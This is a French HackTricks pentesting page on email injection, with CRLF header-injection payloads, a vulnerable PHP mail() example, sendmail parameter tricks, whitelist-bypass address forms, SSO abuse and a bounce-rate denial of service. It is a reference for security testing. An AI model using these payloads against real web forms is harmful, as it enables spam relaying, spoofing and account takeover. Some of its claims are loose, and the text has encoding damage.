# Injections d'e-mails

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injecter dans l'e-mail envoy√©

### Injecter Cc et Bcc apr√®s l'argument de l'exp√©diteur
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
### Injecter un argument

L'argument sera inject√© dans les comptes du destinataire et du destinataire1.
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Le message sera envoy√© au destinataire d'origine ainsi qu'au compte de l'attaquant.

### Injecter l'argument du sujet
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Le sujet factice sera ajout√© au sujet original et dans certains cas, le remplacera. Cela d√©pend du comportement du service de messagerie.

### Modifier le corps du message

Injectez un saut de ligne √† deux lignes, puis √©crivez votre message pour modifier le corps du message.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Exploitation de la fonction mail() de PHP

The `mail()` function in PHP is commonly used to send emails from a web application. However, if not properly secured, it can be vulnerable to email injection attacks. Email injection occurs when an attacker is able to manipulate the email headers and inject malicious content into the email.

#### How email injection works

Email injection attacks typically occur when user-supplied data is directly concatenated into the email headers without proper sanitization or validation. This allows an attacker to insert additional headers or modify existing ones.

For example, consider the following vulnerable code:

```php
$to = $_POST['email'];
$subject = $_POST['subject'];
$message = $_POST['message'];

$headers = "From: " . $_POST['from'] . "\r\n";
$headers .= "Reply-To: " . $_POST['reply-to'] . "\r\n";

mail($to, $subject, $message, $headers);
```

In this code, the values of `$_POST['from']` and `$_POST['reply-to']` are directly concatenated into the `$headers` variable without any validation. An attacker can exploit this by injecting additional headers or modifying existing ones.

#### Exploiting email injection

To exploit email injection, an attacker can craft a malicious payload that includes additional headers or modifies existing ones. For example, an attacker can inject a `Bcc` header to secretly send a copy of the email to themselves or inject a `Content-Type` header to execute malicious code when the email is opened.

Here's an example of an email injection payload:

```
from: attacker@example.com\r\n
reply-to: victim@example.com\r\n
bcc: attacker@example.com\r\n
Content-Type: text/html\r\n

This is a malicious email.
```

When this payload is injected into the vulnerable code, the email will be sent with the additional headers, allowing the attacker to secretly receive a copy of the email and potentially execute malicious code.

#### Prevention

To prevent email injection attacks, it is important to properly sanitize and validate user-supplied data before using it in email headers. Here are some best practices:

- Use proper input validation and sanitization techniques to ensure that user-supplied data does not contain any malicious content.
- Use a secure email library or framework that automatically handles email header injection vulnerabilities.
- If concatenating user-supplied data into email headers, make sure to properly sanitize and validate the data. Use functions like `filter_var()` or regular expressions to ensure that the data conforms to the expected format.
- Avoid using user-supplied data directly in email headers whenever possible. Instead, use separate variables or constants to store the header values.
- Regularly update and patch your PHP installation to ensure that you are using the latest secure version.

By following these best practices, you can protect your web application from email injection attacks and ensure the security of your email communications.
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Le 5√®me param√®tre ($additional\_parameters)

Cette section va se baser sur **comment exploiter ce param√®tre en supposant que l'attaquant le contr√¥le**.

Ce param√®tre va √™tre ajout√© √† la ligne de commande que PHP va utiliser pour invoquer le binaire sendmail. Cependant, il sera nettoy√© avec la fonction `escapeshellcmd($additional_parameters)`.

Un attaquant peut **injecter des param√®tres suppl√©mentaires pour sendmail** dans ce cas.

#### Diff√©rences dans l'impl√©mentation de /usr/sbin/sendmail

L'interface **sendmail** est **fournie par le logiciel de messagerie MTA** (Sendmail, Postfix, Exim, etc.) install√© sur le syst√®me. Bien que la **fonctionnalit√© de base** (comme les param√®tres -t -i -f) reste **la m√™me** pour des raisons de compatibilit√©, **d'autres fonctions et param√®tres** varient consid√©rablement en fonction du MTA install√©.

Voici quelques exemples de diff√©rentes pages de manuel de la commande/interface sendmail :

* Sendmail MTA : http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA : http://www.postfix.org/mailq.1.html
* Exim MTA : https://linux.die.net/man/8/eximReferences

Selon l'**origine du binaire sendmail**, diff√©rentes options ont √©t√© d√©couvertes pour les exploiter et **exfiltrer des fichiers ou m√™me ex√©cuter des commandes arbitraires**. D√©couvrez comment dans [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injection dans le nom de l'e-mail

### Parties ignor√©es d'un e-mail

Les symboles : **+, -** et **{}** peuvent parfois √™tre utilis√©s pour le marquage et ignor√©s par la plupart des serveurs de messagerie

* Par exemple : john.doe+intigriti@example.com ‚Üí john.doe@example.com

Les **commentaires entre parenth√®ses ()** au d√©but ou √† la fin seront √©galement ignor√©s

* Par exemple : john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Contournement de la liste blanche

<figure><img src="../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>

### Guillemets

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### Adresses IP

Vous pouvez √©galement utiliser des adresses IP comme noms de domaine entre crochets :

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Autres vuln√©rabilit√©s

![](<../.gitbook/assets/image (296).png>)

## SSO tiers

### XSS

Certains services comme **github** ou **salesforce vous permettent de cr√©er une **adresse e-mail avec des charges XSS**. Si vous pouvez **utiliser ces fournisseurs pour vous connecter √† d'autres services** et que ces services ne **nettoient pas correctement** l'e-mail, vous pourriez provoquer une **XSS**.

### Prise de contr√¥le de compte

Si un **service SSO** vous permet de **cr√©er un compte sans v√©rifier l'adresse e-mail fournie** (comme **salesforce**) et que vous pouvez ensuite utiliser ce compte pour **vous connecter √† un autre service** qui **fait confiance** √† salesforce, vous pourriez acc√©der √† n'importe quel compte.\
Notez que salesforce indique si l'e-mail fourni a √©t√© v√©rifi√© ou non, mais l'application devrait prendre en compte cette information.

## R√©pondre √†

Vous pouvez envoyer un e-mail en utilisant _**From: company.com**_\*\* \*\* et _**Replay-To: attacker.com**_ et si une **r√©ponse automatique** est envoy√©e en raison de l'envoi de l'e-mail **√† partir** d'une **adresse interne**, l'**attaquant** pourrait √™tre en mesure de **recevoir** cette **r√©ponse**.

## Taux de rebond √©lev√©

Certaines applications comme AWS ont un **taux de rebond √©lev√©** (chez AWS, il est de 10%), ce qui signifie que lorsque le service de messagerie est surcharg√©, le service d'e-mails est bloqu√©.

Un **rebond dur** est un **e-mail** qui n'a pas pu √™tre livr√© pour des raisons permanentes. Peut-√™tre que l'**adresse e-mail** est fausse, peut-√™tre que le domaine de l'**e-mail** n'est pas un vrai domaine, ou peut-√™tre que le serveur du destinataire de l'**e-mail** n'accepte pas les **e-mails**), cela signifie que sur un total de 1000 e-mails, si 100 d'entre eux √©taient faux ou invalides et ont tous rebondi, **AWS SES** bloquera votre service.

Ainsi, si vous √™tes capable d'**envoyer des e-mails (peut-√™tre des invitations)** depuis l'application web vers n'importe quelle adresse e-mail, vous pourriez provoquer ce blocage en envoyant des centaines d'invitations √† des utilisateurs et des domaines inexistants : **D√©ni de service du service de messagerie**.

## R√©f√©rences

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous voulez voir votre **entreprise annonc√©e dans HackTricks** ? ou vous voulez avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement** des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
